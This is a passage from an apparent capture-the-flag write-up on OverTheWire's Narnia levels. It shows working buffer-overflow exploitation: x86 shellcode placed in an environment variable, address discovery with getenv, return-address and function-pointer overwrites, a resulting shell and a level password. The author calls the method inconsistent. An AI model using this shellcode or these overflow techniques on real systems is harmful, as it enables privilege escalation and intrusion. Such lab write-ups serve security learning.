...
Additionally, the value can be overwritten without python, if we give the stdin argument as `12345678901234567890ﾭހ`. `ﾭ` is the equivalent to the hex value `0xefee` and `ހ` which is equivalent to the hex value `0xeade`. This allows for full control of the system as well.
...
Then using `export` and `env` allows us to upload the shell code and verify : 
...
So launching gdb, and setting a breakpoint at the call to `$eax`, which is the `fp(b1)` line. 
...
So it seems that we can overwrite the memory location that `fp` points to point to system instead using a buffer overflow. This `system()` call is already present in memory, so we can find the memory address for this function. This location is printed in gdb.

Additionally since we know that `fp` takes an argument at `b1`, we can provide an argument to system, so we will use `sh;` to call the shell. Then filling the buffer with some filler characters gives us this command.
...
```console
narnia8@narnia:~$ export SHELLCODE=$(printf "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80")
narnia8@narnia:~$ mkdir /tmp/tem_shell
narnia8@narnia:~$ cd /tmp/tem_shell
narnia8@narnia:/tmp/tem_shell$ vim addr.c
```
...
```
narnia8@narnia:/tmp/tem_shell$ gcc -m32 addr.c -o findAddr
narnia8@narnia:/tmp/tem_shell$ ./findAddr
0xffffdea4
narnia8@narnia:/tmp/tem_shell$ cd /narnia/
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print "A"*20') | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 79d8 ffff a8d6 ffff a784 0408  AAAAy...........
00000020: 79d8 ffff 0a                             y....
narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print "A"*20 + "\x6d\xd8\xff\xff" + "AAAA" + "\xa4\xde\xff\xff"')
AAAAAAAAAAAAAAAAAAAAm���AAAA����m���
$ whoami
narnia9
...
The code is inconsistent on the best of days, doing the same thing again and again managed to only get me a handful of correct results. From what I could tell, doing these set of shell commands from login is the most reliable way to get access to the shell. My guess is either my shellcode was wrong, or that the find address c code somehow was wrong. However, I was able to fail with this set of shellcode, so at least on my machine, it is inconsistent. I pulled the shellcode and general idea from [this](https://www.tenouk.com/Bufferoverflowc/bufferoverflowvulexploitdemo32.html) tutorial, this also gave the code for the find address c code.

One thing that we can do, since we don't know the memory location in which to return to, a place where the memory location can we can find and stay consistent is stored as an environment variable. Saving the shellcode in `SHELLCODE`, similar to how we did it in `Level 1`. No matter what I did however, the shellcode that we used for `Level 1` did not work as expected.

To find the location of `SHELLCODE`, the `getenv()` method can be used from C. This function returns the environment variable, and we can display the pointer using a `%p` specifier. This c file was then compiled in 32 bit to get an 8-byte address. Additionally, there we have to match the memory blocks once again, so we can look at `0xffffd879`, since we add 12 bytes to buffer, we must subtract 12 bytes from this value, so `0xffffd86d` is written to get it to work. The next four bytes don't matter, so we can fill that with `AAAA`. Finally, finishing by adding the environment variable memory location to overwrite the return address to be run when we return from the function.

Running this function gave us access to the shell and `eiL5fealae` is the final password!
